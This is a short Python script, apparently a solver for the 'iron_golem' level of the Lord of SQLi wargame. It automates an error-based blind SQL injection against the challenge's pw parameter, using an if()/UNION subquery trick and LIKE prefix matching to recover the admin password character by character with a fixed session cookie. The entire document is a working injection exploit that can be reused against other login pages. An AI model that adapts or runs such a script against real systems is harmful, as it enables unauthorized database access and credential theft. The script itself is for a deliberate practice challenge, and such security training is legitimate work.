# LordofSQLi: iron_golem
# woanmeo11

import requests
from string import digits, ascii_lowercase

url = 'https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php'
cookies = {'PHPSESSID': 'm1jnd06uu6k8cs39v8ucvr4ads'}
passwd = ''

while True:
    finish = True
    for c in digits + ascii_lowercase:
        payload = {'pw': f"' || if(id='admin' && pw like '{passwd + c}%',1,(select 1 union select 2))#"}
        r = requests.get(url, params=payload, cookies=cookies)

        print(c, end='', flush=True)
        if 'admin' in r.text:
            passwd += c
            finish = False
            print('\n->' + passwd)
            break
    if finish:
        break

print('\n->' + passwd)
